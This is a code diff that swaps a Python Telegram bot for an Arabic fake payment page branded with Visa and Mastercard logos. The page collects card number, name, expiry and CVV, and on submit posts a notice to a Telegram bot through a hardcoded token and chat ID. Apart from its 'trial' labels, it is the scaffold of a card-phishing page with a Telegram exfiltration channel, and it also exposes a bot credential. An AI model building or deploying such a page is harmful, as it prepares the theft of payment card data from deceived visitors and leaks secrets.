@@ -1,76 +1,142 @@
-import os
-import logging
-import asyncio
-from flask import Flask, request
-from telegram import Update
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    ContextTypes
-)
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>بوابة الدفع التجريبية</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    header, footer {
+      background-color: #004080;
+      color: white;
+      text-align: center;
+      padding: 20px 0;
+    }
+    main {
+      padding: 20px;
+    }
+    form {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px;
+      width: 100%;
+      background-color: #004080;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .card-logos {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .card-logos img {
+      height: 50px;
+    }
+  </style>
+</head>
+<body>
 
-# إعداد اللوج
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+  <header>
+    <div class="card-logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
+    </div>
+  </header>
 
-# ========== الإعدادات ==========
-BOT_TOKEN = os.getenv("BOT_TOKEN", "")   # ضع التوكن الجديد في متغير بيئة
-OWNER_ID = 16420566                      # رقم المستخدم (أنت)
+  <main>
+    <form id="paymentForm">
 
-# إعدادات الويب هوك
-WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://yourdomain.com/webhook")
-PORT = int(os.environ.get("PORT", "8443"))
+      <label for="confirmBooking">تأكيد رقم الحجز (تجريبي):</label>
+      <input type="text" id="confirmBooking" required />
 
-# ========== أوامر البوت ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if user.id == OWNER_ID:
-        await update.message.reply_text("مرحباً أيها الأدمن ✅")
-    else:
-        await update.message.reply_text("هذا بوت خاص ❌")
+      <label for="cardNumber">رقم البطاقة (تجريبي):</label>
+      <input type="text" id="cardNumber" required />
 
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("البوت شغال ✅")
+      <label for="cardName">الاسم على البطاقة (تجريبي):</label>
+      <input type="text" id="cardName" required />
 
-# ========== معالجة الأخطاء ==========
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    logger.error("Exception: %s", context.error, exc_info=True)
-    try:
-        if OWNER_ID:
-            await context.bot.send_message(
-                chat_id=OWNER_ID,
-                text=f"⚠️ خطأ في البوت:\n{context.error}"
-            )
-    except Exception as e:
-        logger.error("Failed to send error to owner: %s", e)
+      <label for="expiryMonth">الشهر:</label>
+      <select id="expiryMonth" required>
+        <option value="">--</option>
+        <option>01</option><option>02</option><option>03</option>
+        <option>04</option><option>05</option><option>06</option>
+        <option>07</option><option>08</option><option>09</option>
+        <option>10</option><option>11</option><option>12</option>
+      </select>
 
-# ========== الإعداد ==========
-app = Flask(__name__)
-tg_app = Application.builder().token(BOT_TOKEN).build()
+      <label for="expiryYear">السنة:</label>
+      <select id="expiryYear" required>
+        <option value="">--</option>
+        <option>2025</option><option>2026</option><option>2027</option>
+        <option>2028</option><option>2029</option><option>2030</option>
+      </select>
 
-tg_app.add_handler(CommandHandler("start", start))
-tg_app.add_handler(CommandHandler("status", status))
-tg_app.add_error_handler(error_handler)
+      <label for="cvv">CVV (تجريبي):</label>
+      <input type="text" id="cvv" required />
 
-@app.route("/webhook", methods=["POST"])
-def webhook():
-    update = Update.de_json(request.get_json(force=True), tg_app.bot)
-    tg_app.update_queue.put_nowait(update)
-    return "ok"
+      <button type="submit">ادفع الآن</button>
+    </form>
+  </main>
 
-# ========== تشغيل ==========
-if __name__ == "__main__":
-    # إعداد الويب هوك عند التشغيل
-    async def set_webhook():
-        await tg_app.bot.set_webhook(WEBHOOK_URL)
-    asyncio.run(set_webhook())
+  <footer>
+    جميع الحقوق محفوظة ©️ 2025 - نسخة تجريبية
+  </footer>
 
-    tg_app.run_webhook(
-        listen="0.0.0.0",
-        port=PORT,
-        url_path="webhook",
-        webhook_url=WEBHOOK_URL
-    )
+  <script>
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      // رسالة تجريبية فقط
+      const message = `
+🚀 إشعار تجريبي
+زائر جديد ضغط على زر "ادفع الآن"
+`;
+
+      // هنا أستخدم بيانات البوت اللي أعطيتني إياها
+      fetch("https://api.telegram.org/bot7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "16420566",
+          text: message
+        })
+      })
+      .then(() => {
+        alert("✅ تمت العملية التجريبية بنجاح! (تم إرسال إشعار إلى البوت)");
+      })
+      .catch(() => {
+        alert("❌ فشل الاتصال بالبـوت");
+      });
+    });
+  </script>
+
+</body>
+</html>
